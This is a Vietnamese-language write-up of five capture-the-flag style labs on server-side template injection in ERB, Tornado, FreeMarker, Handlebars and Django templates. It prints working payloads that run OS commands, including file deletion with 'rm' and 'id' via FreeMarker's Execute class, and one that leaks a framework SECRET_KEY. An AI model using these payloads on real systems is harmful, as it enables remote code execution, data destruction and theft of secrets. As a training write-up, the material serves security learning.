# Basic server-side template injection
## Target Goal: 

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

## Analysis: 
Khi bấm vào `View detail` ta sẽ thấy một sản phẩm trả về message "Unfortunately this product is out of stock"

![image](https://github.com/user-attachments/assets/8752b381-be51-41ed-8323-f21da85c4b67)

Theo mô tả của [Target Goat](https://hackmd.io/rEeTyWhZQrWOoodomnPI6A?view#Target-Goal) con web này sử dụng ERB engine. Ta sẽ sử dụng payload này để xem nó có bị thực thi hay không
```
<%= 7 * 7 %>
```
![image](https://hackmd.io/_uploads/H1yPjVfhA.png)

Thừa thắng xông lên, ta sẽ dùng payload này để xóa `morale.txt` và hoàn thành bài lablab
```
<%= system('rm morale.txt') %>
```

## Flag:
![image](https://hackmd.io/_uploads/ByjWp4Gn0.png)

# Basic server-side template injection (code context)
## Target Goal:
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis: 
Sau khi đăng nhập vào tài khoản được cấp, chúng ta có chức năng `Preferred Name`:

![image](https://hackmd.io/_uploads/B1DKMSznR.png)

Khi ấn vào dropbox và chọn Nickname -> Submit sẽ có 1 request POST được gửi đi:

![image](https://hackmd.io/_uploads/ry8GQSf3C.png)

Request này sẽ đổi tham số `blog-post-author-display` -> Tên user khi thực hiện comment trên các bài blog thay đổi thành name , nickname hoặc first name (ở đây là **user.nickname**)

![image](https://hackmd.io/_uploads/BkuAXrMhC.png)

Có thể hiểu server render tên author bằng expression: `{{
blog-post-author-display}}`

Nhưng tham số này ta hoàn toán có thể thay đổi theo ý thích, do mô tả đã gợi ý template được sử dụng là Tornado, mình thử inject payload kiểm tra SSTI như sau:

```
blog-post-author-display=7*'7'
```

-> Khi render sẽ trở thành {{7*'7'}}

![image](https://hackmd.io/_uploads/SkNwSSM3A.png)

![image](https://hackmd.io/_uploads/HJ-9HBfnR.png)

Dựa vào hacktricks có thể xác định vị trí này dính lỗ hổng SSTI -> Sau khi biết chỗ có thể inject ta chỉ cần thay đổi vầ chèn payload thực hiện lệnh OS theo yếu cầu bài lab:

```
blog-post-author-display=7*'7'}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

```
7*'7'}} -> Inject và kết thúc sớm expression
{% import os %}{{os.system('rm /home/carlos/morale.txt') -> Import để chạy các lệnh OS và thực hiện remove file.
```

![image](https://hackmd.io/_uploads/B1U2SSGhA.png)

## Flag:

![image](https://hackmd.io/_uploads/HkJKLBMhA.png)

# Server-side template injection using documentation
## Target Goal:
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials:
```
content-manager:C0nt3ntM4n4g3r
```
## Analysis:
Sau khi đăng nhập vào tài khoản được cấp, chúng ta có chức năng **Edit template** ở detail ở các sản phẩm

![image](https://hackmd.io/_uploads/SJYCeIzhA.png)

Khi ta thử payload `${7*7}` có thể đoán nó sử dụng ERB engine

![image](https://hackmd.io/_uploads/SJ5NZ8z2R.png)

Tuy nhiên khi sử dụng payload của loại engine này nó trả về lỗi của **Freemaker**. Lý do là các loại lỗ hổng SSTI của các engine có thể giống nhau

![image](https://hackmd.io/_uploads/rJ0FfUGhA.png)

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
```

![image](https://hackmd.io/_uploads/B1LFX8G3C.png)

Gửi payload cuối cùng và hoàn thành bài lab
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")}
```

## Flag:

![image](https://hackmd.io/_uploads/BkWF6IM3A.png)

# Server-side template injection in an unknown language with a documented exploit
## Target Goal:
This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

## Analysis:
Khi bấm vào `View detail` ta sẽ thấy một sản phẩm trả về message "Unfortunately this product is out of stock"

![image](https://hackmd.io/_uploads/HysNjNM3A.png)

Khi dùng payload `{{7/0}}` nó trả về lỗi như bên dưới và ta biết được nó dùng **Handlebars** (NodeJS) template

![image](https://hackmd.io/_uploads/rkhshUG2A.png)

Sử dụng payload ở dưới và sửa lại thành `rm morale.txt` ta sẽ hoàn thành bài lab

![image](https://hackmd.io/_uploads/S10-p8fhA.png)

## Flag:
![image](https://hackmd.io/_uploads/SkNI28Mh0.png)

# Server-side template injection with information disclosure via user-supplied objects
## Target Goal:
This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials:
```
content-manager:C0nt3ntM4n4g3r
```
## Analysis:
Sau khi đăng nhập vào tài khoản được cấp, chúng ta có chức năng **Edit template** ở detail ở các sản phẩm

![image](https://hackmd.io/_uploads/SJyFyvf3A.png)

Sử dụng `${{<%[%'"}}%\` để nó chạy ra lỗi và phát hiện server sử dụng django template

![image](https://hackmd.io/_uploads/Sk-D1vG3R.png)

Có một dòng cần chú ý lf nó có thể lẫn cả Jinja2 nên có thể một số payload của Jinja2 thực thi được

![image](https://hackmd.io/_uploads/B1V5WPf2A.png)

Do đó với payload `{{settings.SECRET_KEY}}` vẫn thực thi được

![image](https://hackmd.io/_uploads/H1n5zvGnR.png)

Hoàn thành bài lab

![image](https://hackmd.io/_uploads/BJg6lwz2R.png)

## Flag:

![image](https://hackmd.io/_uploads/HkgAfDz20.png)
